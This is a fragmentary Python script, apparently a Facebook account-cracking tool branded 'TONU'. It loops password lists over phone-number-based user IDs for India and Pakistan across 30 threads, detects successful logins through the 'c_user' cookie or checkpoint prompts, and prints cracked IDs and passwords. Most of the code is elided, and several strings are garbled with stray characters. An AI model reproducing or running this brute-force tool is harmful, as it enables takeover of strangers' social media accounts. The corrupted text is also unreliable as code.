...
if ltx > 12:
    ...
    a = ltx
    tag = "AM"
logo =f"""{WHITE}________________ _____________________🔥
 |  _ \|  __ \    |__   __|  ____|  __ \|  \/  | |  | \ \ / /
 | |_) | |  | |______| |  | |__  | |__) | \  / | |  | |\ V / 
 |  _ <| |  | |______| |  |  __| |  _  /| |\/| | |  | | > <  
 | |_) | |__| |      | |  | |____| | \ \| |  | | |__| |/ . \ 
...
def xyz():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/SADHARON.USER.143");xyz()
    elif hamii in ["3","03"]:
       ...
       exit()
        ...
        print('\033[1;31mINCOREC6T OPTION!\033[1;31m')
        xyz()
#---------------------[PASS DEF]---------------------#
def password():
    ...
    if passX in ['1','01']:
        os.system("xdg-open https://www.facebook.com/groups/672751520627850/")
        password1()
    elif passX in ['2','02']:
        os.system("xdg-open https://www.facebook.com/groups/672751520627850/")
        password2()
...
def password1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}COUNhTRY YOU CHOOSE    : {WHITE}INDIA")
...
def free1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\33[1;37m[TONU🔥] [%s] \33[1;97m[OK:%s{TONU}CP:%s]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
           ...
           "scheme": 'https',
            ...
            "accept-language": h'en-US,en;q=0.9',
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    print(f'\r\033[1;35m[TONU-CP] '+uid+' [×] '+ps+ ' ')
...
def password2():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\03g3[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mEXAMPLE :👇\033[0;m]")
    print(f"")
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TONU 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
...
def password5():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}COUNTRY YOU CHOOSE    : {GREEN}PAKISTAN 🇵🇰")
        print(f" {WHITE}NUMBddER YOU PUT        : {YELLOW}"+code)
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
        print(f'{RED}==========================================================')
        for love in user:
...
def Tabii3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}PROCESdididkS HAS BEEN STARTED")
